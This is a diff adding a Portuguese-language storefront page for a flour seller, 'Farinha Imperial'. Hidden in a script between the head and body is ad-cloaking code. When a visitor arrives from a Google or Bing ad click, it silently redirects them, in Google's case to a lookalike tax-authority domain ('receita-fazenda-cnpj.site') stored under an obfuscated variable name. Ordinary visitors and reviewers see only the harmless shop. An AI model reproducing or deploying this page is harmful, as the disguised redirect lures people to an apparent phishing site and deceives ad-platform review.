@@ -1,1 +1,194 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Farinha Imperial</title>
 
+<style>
+body {
+    margin: 0;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #fffdf7;
+}
+
+header {
+    background: #c49a2c;
+    color: white;
+    padding: 20px;
+    text-align: center;
+}
+
+nav {
+    background: #8b6b1f;
+    padding: 10px;
+    text-align: center;
+}
+
+nav a {
+    color: white;
+    text-decoration: none;
+    margin: 0 15px;
+    font-weight: bold;
+}
+
+.banner {
+    padding: 60px;
+    text-align: center;
+    background: #f4e3a1;
+}
+
+.produtos {
+    padding: 40px;
+    text-align: center;
+}
+
+.card {
+    width: 250px;
+    display: inline-block;
+    margin: 20px;
+    padding: 20px;
+    border: 1px solid #ddd;
+    border-radius: 10px;
+    background: white;
+}
+
+.card img {
+    width: 100%;
+}
+
+.botao {
+    background: #c49a2c;
+    color: white;
+    padding: 10px 20px;
+    border: none;
+    cursor: pointer;
+}
+
+footer {
+    background: #8b6b1f;
+    color: white;
+    text-align: center;
+    padding: 20px;
+}
+</style>
+</head>
+<script>
+
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://www8.receita-fazenda-cnpj.site/buscar';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<header>
+<h1>Farinha Imperial</h1>
+<p>A melhor farinha direto do produtor</p>
+</header>
+
+<nav>
+<a href="#">Início</a>
+<a href="#">Produtos</a>
+<a href="#">Sobre</a>
+<a href="#">Contato</a>
+</nav>
+
+<section class="banner">
+<h2>Qualidade e tradição na sua mesa</h2>
+<p>Produzida com grãos selecionados e moagem especial.</p>
+<button class="botao">Comprar Agora</button>
+</section>
+
+<section class="produtos">
+
+<div class="card">
+<img src="https://via.placeholder.com/200">
+<h3>Farinha de Mandioca</h3>
+<p>Pacote 1kg</p>
+<button class="botao">Comprar</button>
+</div>
+
+<div class="card">
+<img src="https://via.placeholder.com/200">
+<h3>Farinha de Milho</h3>
+<p>Pacote 1kg</p>
+<button class="botao">Comprar</button>
+</div>
+
+<div class="card">
+<img src="https://via.placeholder.com/200">
+<h3>Farinha de Trigo</h3>
+<p>Pacote 1kg</p>
+<button class="botao">Comprar</button>
+</div>
+
+</section>
+
+<footer>
+<p>© 2025 Farinha Imperial LTDA</p>
+<p>CNPJ: 00.000.000/0001-00</p>
+<p>Endereço: Rua das Indústrias, 456 - Imperatriz - MA</p>
+</footer>
+
+</body>
+</html>
